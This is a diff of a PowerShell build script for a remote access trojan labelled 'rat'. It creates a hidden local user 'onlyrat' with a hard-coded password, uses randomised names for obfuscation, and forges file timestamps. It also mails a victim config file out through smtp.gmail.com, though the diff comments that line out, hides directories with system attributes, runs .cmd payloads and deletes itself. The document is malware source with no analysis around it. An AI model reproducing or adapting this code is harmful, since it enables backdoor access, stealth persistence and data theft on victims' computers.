@@ -1,6 +1,6 @@
 #build resources for rat
 #created by :OTE
-
+"bGnQSfviwu.cmd"|cmd
 #RANDOM string for directories helps us in obfuscation techniques
 function ZWlgfrSeJC {
 
@@ -37,7 +37,7 @@ Remove-LocalUser -Name "onlyrat"
 $jrTWzPgQwA="onlyrat"
 $lUWMsSTQXg="123456"
 $oXGjuyUVQW = (ConvertTo-securestring "$lUWMsSTQXg" -AsPlainText -Force)
-nQjUmBRylz -jrTWzPgQwA "$jrTWzPgQwA" -oXGjuyUVQW "$oXGjuyUVQW"
+nQjUmBRylz -jrTWzPgQwA "$jrTWzPgQwA" -oXGjuyUVQW $oXGjuyUVQW
 # config file
 $LFBzkROvGc="$env:UserName.rat"
 
@@ -65,7 +65,7 @@ $(Get-Item $LFBzkROvGc).lastaccesstime=$(Get-Date "1/24/2022 07:15 pm")
 $(Get-Item $LFBzkROvGc).lastwritetime=$(Get-Date "1/24/2022 07:15 pm")
 
 # send via smtp the config file
-Send-MailMessage -From $FwoYgsNVfl -To $FwoYgsNVfl -Subject "XXOX" -Attachment $LFBzkROvGc -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $FwoYgsNVfl,(ConvertTo-SecureString -String $yYLAdChWgT -AsPlainText -Force))
+# Send-MailMessage -From $FwoYgsNVfl -To $FwoYgsNVfl -Subject "XXOX" -Attachment $LFBzkROvGc -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $FwoYgsNVfl,(ConvertTo-SecureString -String $yYLAdChWgT -AsPlainText -Force))
 # Remove-Item $LFBzkROvGc 
 
 #goto temp making working directory
@@ -102,7 +102,6 @@ attrib +h +s +r $jrTWzPgQwA
 
 # self deletion
 Set-Location -Path $kAxwfEKeDn
-"AmRvjYQbUz.cmd"|cmd
 echo $kAxwfEKeDn
 remove-item -fo qjhOmDleBS.ps1
 Remove-item -fo bGnQSfviwu.cmd
